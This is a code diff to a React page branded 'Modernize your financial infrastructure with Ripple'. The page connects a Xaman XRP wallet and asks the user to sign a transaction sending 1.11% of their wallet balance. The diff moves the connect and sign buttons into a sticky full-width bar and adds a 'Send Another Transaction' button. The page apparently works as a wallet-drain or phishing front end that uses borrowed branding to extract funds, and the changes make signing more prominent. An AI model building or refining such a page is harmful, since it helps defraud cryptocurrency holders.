@@ -221,7 +221,7 @@
                 </div>
               </header>
 
-              <main className="max-w-4xl mx-auto px-6 py-20">
+              <main className="max-w-4xl mx-auto px-6 py-20 pb-32">
                 <div className="text-center mb-16">
                   <h1 className="text-5xl md:text-6xl font-bold text-white mb-6 leading-tight">
                     Modernize your financial infrastructure with Ripple
@@ -239,7 +239,7 @@
                   </p>
                 </div>
 
-                <div className="bg-slate-800/50 backdrop-blur-sm border border-slate-700/50 rounded-2xl p-8 md:p-12 shadow-2xl">
+                <div className="bg-slate-800/50 backdrop-blur-sm border border-slate-700/50 rounded-2xl p-8 md:p-12 shadow-2xl mb-24">
                   {!isConnected ? (
                     <div className="text-center">
                       <div className="w-20 h-20 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
@@ -264,21 +264,6 @@
                       {isLoading && isMobile && (
                         <p className="text-blue-400 mb-6">Opening Xaman app...</p>
                       )}
-                      
-                      <button
-                        onClick={connectWallet}
-                        disabled={isLoading}
-                        className="px-8 py-4 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-800 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-blue-500/50"
-                      >
-                        {isLoading ? (
-                          <span className="flex items-center gap-2">
-                            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                            Waiting for Xaman...
-                          </span>
-                        ) : (
-                          'Connect Xaman Wallet'
-                        )}
-                      </button>
                       
                       {txStatus === 'rejected' && (
                         <p className="text-red-400 mt-4">Connection was rejected. Please try again.</p>
@@ -419,24 +404,61 @@
                           <p className="text-slate-400 mb-8 max-w-md mx-auto">
                             Review and sign the transaction in your Xaman wallet to send 1.11% of your balance ({(parseFloat(calculatedAmount) / 1000000).toFixed(6)} XRP)
                           </p>
-                          <button
-                            onClick={signTransaction}
-                            disabled={isLoading}
-                            className="px-8 py-4 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-800 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-blue-500/50"
-                          >
-                            {isLoading ? (
-                              <span className="flex items-center gap-2">
-                                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                                Waiting for signature...
-                              </span>
-                            ) : (
-                              'Sign Transaction'
-                            )}
-                          </button>
                         </div>
                       )}
                     </div>
                   )}
+                </div>
+
+                {/* Sticky Button Container */}
+                <div className="fixed bottom-0 left-0 right-0 bg-gradient-to-t from-slate-900 via-slate-900 to-transparent p-6 pb-8 z-50">
+                  <div className="max-w-md mx-auto">
+                    {!isConnected ? (
+                      <button
+                        onClick={connectWallet}
+                        disabled={isLoading}
+                        className="w-full px-8 py-4 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-800 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-blue-500/50"
+                      >
+                        {isLoading ? (
+                          <span className="flex items-center justify-center gap-2">
+                            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                            Waiting for Xaman...
+                          </span>
+                        ) : (
+                          'Connect Xaman Wallet'
+                        )}
+                      </button>
+                    ) : txStatus === 'connected' ? (
+                      <button
+                        onClick={signTransaction}
+                        disabled={isLoading}
+                        className="w-full px-8 py-4 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-800 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-blue-500/50"
+                      >
+                        {isLoading ? (
+                          <span className="flex items-center justify-center gap-2">
+                            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                            Waiting for signature...
+                          </span>
+                        ) : (
+                          'Sign Transaction'
+                        )}
+                      </button>
+                    ) : txStatus === 'success' ? (
+                      <button
+                        onClick={() => setTxStatus('connected')}
+                        className="w-full px-8 py-4 bg-slate-700 hover:bg-slate-600 text-white font-semibold rounded-xl transition-all"
+                      >
+                        Send Another Transaction
+                      </button>
+                    ) : txStatus === 'error' || txStatus === 'rejected' ? (
+                      <button
+                        onClick={() => setTxStatus('connected')}
+                        className="w-full px-8 py-4 bg-slate-700 hover:bg-slate-600 text-white font-semibold rounded-xl transition-all"
+                      >
+                        Go Back
+                      </button>
+                    ) : null}
+                  </div>
                 </div>
 
                 <div className="mt-12 text-center">
